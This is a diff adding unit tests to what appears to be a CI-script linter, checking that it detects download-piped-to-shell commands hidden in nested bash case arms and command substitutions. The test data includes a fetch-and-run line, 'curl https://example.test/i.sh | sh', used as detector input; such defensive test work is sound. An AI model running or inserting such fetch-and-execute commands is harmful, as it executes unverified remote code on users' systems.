@@ -20,6 +20,55 @@ def defects(script):
     return wg.job_defects([("step", script)])
 
 
+class TestNestedCaseArmPayloads(unittest.TestCase):
+    """#2617: nested arm bodies reach the operand walk, not only the lexer."""
+
+    SHELLS = (None, "bash", "sh", "bash {0}", "bash -e {0}",
+              "bash -eo pipefail {0}", "sh {0}", "sh -e {0}")
+
+    @staticmethod
+    def nested(body, depth=2):
+        return "case a in a) " * depth + body + ";; esac" * depth
+
+    def test_payloads_at_two_and_three_levels_under_every_shell_posture(self):
+        scripts = (
+            self.nested(PIPE),
+            self.nested(PIPE, 3),
+            "case a in a)case a in a) " + PIPE + ";;esac;;esac",
+            "case a in (b|a) case a in (a|b) " + PIPE + ";; esac;; esac",
+            "x=$(" + self.nested(PIPE) + ")",
+            "x=$(" + self.nested(PIPE, 3) + ")",
+            "case a in a) :;& b) " + self.nested(PIPE, 1) + ";; esac",
+            "case a in a) :;;& a) " + self.nested(PIPE, 1) + ";; esac",
+            "case a in a) case a in a) :;& b) " + PIPE + ";; esac;; esac",
+            "case a in a) case a in a) :;;& a) " + PIPE + ";; esac;; esac",
+        )
+        for script in scripts:
+            for shell in self.SHELLS:
+                with self.subTest(script=script, shell=shell):
+                    found = wg.job_defects([wg.Step("step", script, shell=shell)])
+                    self.assertTrue(found)
+                    self.assertTrue(any("straight to `sh`" in reason for _, reason in found), found)
+
+    def test_clean_nested_bodies_beside_their_must_trip_controls(self):
+        for body, payload in (
+            (self.nested("echo harmless"), self.nested(PIPE)),
+            ("x=$(" + self.nested("echo harmless", 3) + ")",
+             "x=$(" + self.nested(PIPE, 3) + ")"),
+            (self.nested("echo '@@casearm@@curl https://example.test/i.sh | sh'"),
+             self.nested(PIPE)),
+        ):
+            with self.subTest(script=body):
+                self.assertEqual([], defects(body))
+                self.assertTrue(defects(payload))
+        self.assertTrue(defects(self.nested(PIPE, 1)))
+
+    def test_an_inner_check_does_not_cover_a_sibling_of_the_parent_arm(self):
+        script = (GET + "case b in a) case a in a) echo '" + "a" * 64
+                  + "  tool' | sha256sum -c -;; esac;; b) sh tool;; esac")
+        self.assertTrue(defects(script))
+
+
 class TestAssignmentPrefixes(unittest.TestCase):
     """#2348: `A+=x`, `a[1]=x` and `arr=(a)` in front of a command are
     assignments, and bash runs the command behind them."""
